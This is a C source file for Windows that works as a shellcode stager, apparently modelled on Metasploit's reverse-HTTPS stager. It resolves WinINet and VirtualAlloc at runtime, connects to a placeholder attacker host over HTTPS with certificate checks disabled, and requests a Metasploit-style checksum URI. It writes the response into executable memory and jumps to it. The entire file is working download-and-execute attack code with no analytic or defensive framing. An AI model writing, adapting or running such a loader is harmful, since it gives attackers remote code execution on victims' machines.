#include <Windows.h>
#include <winhttp.h>
#include <wininet.h>
#include <stdio.h>

/*
HINTERNET InternetOpenA(
  [in] LPCSTR lpszAgent,
  [in] DWORD  dwAccessType,
  [in] LPCSTR lpszProxy,
  [in] LPCSTR lpszProxyBypass,
  [in] DWORD  dwFlags
);
*/

typedef LPVOID(WINAPI* pInternetOpenA)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);

/*
HINTERNET InternetConnectA(
  [in] HINTERNET     hInternet,
  [in] LPCSTR        lpszServerName,
  [in] INTERNET_PORT nServerPort,
  [in] LPCSTR        lpszUserName,
  [in] LPCSTR        lpszPassword,
  [in] DWORD         dwService,
  [in] DWORD         dwFlags,
  [in] DWORD_PTR     dwContext
);
*/

typedef LPVOID(WINAPI* pInternetConnectA)(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);

/*
HINTERNET HttpOpenRequestA(
  [in] HINTERNET hConnect,
  [in] LPCSTR    lpszVerb,
  [in] LPCSTR    lpszObjectName,
  [in] LPCSTR    lpszVersion,
  [in] LPCSTR    lpszReferrer,
  [in] LPCSTR    *lplpszAcceptTypes,
  [in] DWORD     dwFlags,
  [in] DWORD_PTR dwContext
);
*/

typedef LPVOID(WINAPI* pHttpOpenRequestA)(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);

/*
BOOL InternetSetOptionA(
  [in] HINTERNET hInternet,
  [in] DWORD     dwOption,
  [in] LPVOID    lpBuffer,
  [in] DWORD     dwBufferLength
);
*/

typedef BOOL(WINAPI* pInternetSetOptionA)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);

/*
BOOL HttpSendRequestA(
	[in] HINTERNET hRequest,
	[in] LPCSTR    lpszHeaders,
	[in] DWORD     dwHeadersLength,
	[in] LPVOID    lpOptional,
	[in] DWORD     dwOptionalLength
);
*/

typedef BOOL(WINAPI* pHttpSendRequestA)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);

/*
BOOL InternetReadFile(
  [in]  HINTERNET hFile,
  [out] LPVOID    lpBuffer,
  [in]  DWORD     dwNumberOfBytesToRead,
  [out] LPDWORD   lpdwNumberOfBytesRead
);
*/

typedef LPVOID(WINAPI* pInternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);

/*
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);*/

typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD fAllocationType, DWORD flProtect);


int main()
{
	const char* host = "<changeme>";
	WORD port = 443;

	HMODULE wininetdll;
	HMODULE kernel32dll;

	wininetdll = LoadLibraryA("Wininet");
	kernel32dll = LoadLibraryA("Kernel32");

	pVirtualAlloc VirtualAlloc = (pVirtualAlloc)GetProcAddress(kernel32dll, "VirtualAlloc");
	printf("[*] found VirtualAlloc: 0x%p\n", VirtualAlloc);
	pInternetOpenA InternetOpenA = (pInternetOpenA)GetProcAddress(wininetdll, "InternetOpenA");
	printf("[*] found InternetOpenA: 0x%p\n", InternetOpenA);
	pInternetConnectA InternetConnectA = (pInternetConnectA)GetProcAddress(wininetdll, "InternetConnectA");
	printf("[*] found InternetConnectA: 0x%p\n", InternetConnectA);
	pHttpOpenRequestA HttpOpenRequestA = (pHttpOpenRequestA)GetProcAddress(wininetdll, "HttpOpenRequestA");
	printf("[*] found HttpOpenRequestA: 0x%p\n", HttpOpenRequestA);
	pInternetSetOptionA InternetSetOptionA = (pInternetSetOptionA)GetProcAddress(wininetdll, "InternetSetOptionA");
	printf("[*] found InternetSetOptionA: 0x%p\n", InternetSetOptionA);
	pHttpSendRequestA HttpSendRequestA = (pHttpSendRequestA)GetProcAddress(wininetdll, "HttpSendRequestA");
	printf("[*] found HttpSendRequestA: 0x%p\n", HttpSendRequestA);
	pInternetReadFile InternetReadFile = (pInternetReadFile)GetProcAddress(wininetdll, "InternetReadFile");
	printf("[*] found InternetReadFile: 0x%p\n", InternetReadFile);

	const char * MSF_CHECKSUM = "/4ULK85uw8Ng8Rz1FVmljOA5pL4K-vfHmdpMBaxmSC79ks6eYLJPIVjYlp7FnOT5yZH9vCHDzSlDh_cf8O7d91xcGg7nWy92ytQd4vHtobk9AROm1rWBOmL8c2dP4DljBnXSa47e4do-RFBa8qC7jNSKLmE-vP7vzPsgFU3bTHdx3jAIr65fHH5LogExlncBSeN_gGoBYkPqZUOjcRh7Tk0c1mbsQt_kLBDaB9zmNzvnVmX50vL92mIZ";
	
	__try
	{
		DWORD securityFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
		HINTERNET hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		HINTERNET hConnect = InternetConnectA(hInternet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
		HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", MSF_CHECKSUM, NULL, NULL, NULL,
			INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_UI, 0);
		BOOL res = InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));
		BOOL hFile = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);

		SIZE_T memsize = 0x00400000;
		SIZE_T bytesToRead = 8192;
		DWORD bytesRead;

		LPVOID memalloc = VirtualAlloc(NULL, memsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		LPVOID expladdr = memalloc;
		SIZE_T explsize = 0;

		if (InternetReadFile(hRequest, memalloc, bytesToRead, &bytesRead))
		{
			while (bytesRead != 0)
			{
				explsize = explsize + bytesToRead;
				memalloc = (char*)memalloc + bytesRead;
				InternetReadFile(hRequest, memalloc, bytesToRead, &bytesRead);
			}
		}
		printf("[*] Downloaded %d bytes\n", explsize);
		printf("[*] Starting expl...\n");
		((void(*)())expladdr)();
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		printf("0x%x\n", GetExceptionCode());
	}

	return 1;
}